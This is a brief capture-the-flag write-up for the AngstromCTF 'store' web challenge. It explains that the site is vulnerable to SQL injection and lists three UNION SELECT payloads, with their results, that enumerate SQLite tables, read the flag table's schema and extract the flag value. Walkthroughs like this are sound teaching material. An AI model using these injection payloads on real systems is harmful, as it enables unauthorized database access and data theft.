<font size = '4'>
<p align = 'center'>
<b>
AngstromCTF - store Writeup 
</b>
</p>
</font>

<br>
<font size = '3'>

<b>Challenge Description:</b><br>

https://store.web.actf.co/

<br>

<b>Exploitation:</b><br>

SQLI. Database can be found out using sqlmap. 

Payloads used:

```sql
' UNION SELECT 'a','a',tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- => flags24672d7c59b258a88d425605e3957cb4

' UNION SELECT 'a','a',sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='flags24672d7c59b258a88d425605e3957cb4'-- => ( flag TEXT)

' UNION SELECT 'a','a',flag FROM flags24672d7c59b258a88d425605e3957cb4-- => actf{37619bbd0b81c257b70013fa1572f4ed}
```